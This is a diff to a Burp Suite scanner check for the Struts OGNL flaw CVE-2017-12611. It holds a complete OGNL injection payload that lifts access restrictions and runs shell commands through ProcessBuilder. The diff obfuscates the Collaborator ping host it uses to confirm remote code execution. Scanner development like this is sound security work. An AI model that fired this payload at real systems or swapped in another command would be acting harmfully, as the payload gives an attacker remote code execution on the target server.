@@ -17,10 +17,12 @@ public class Struts201712611Scan extends ParamScan {
         IBurpCollaboratorClientContext collab = callbacks.createBurpCollaboratorClientContext();
 
         // set the needed strings before and after the command to be executed
-        String paramPre = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='";
-        String paramPost = "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
-        String collabPayload = collab.generatePayload(true); // create a Collaborator payload
-        String command = "ping " + collabPayload + " -c1"; // platform-agnostic command to check for RCE via DNS interaction
+        String paramPre = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=";
+        String paramPost = ").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
+
+        String obfuscateDomain = Utilities.randomString(7);
+        String collabPayload = collab.generatePayload(false) + "."+ obfuscateDomain + collab.getCollaboratorServerLocation();
+        String command = "('ping " + collabPayload + " -c1').replace('"+obfuscateDomain+"', '')"; // platform-agnostic command to check for RCE via DNS interaction
         String attackParam = paramPre + command + paramPost;
 
         IHttpRequestResponse attack = request2(basePair, insertionPoint, attackParam); // issue the attack request
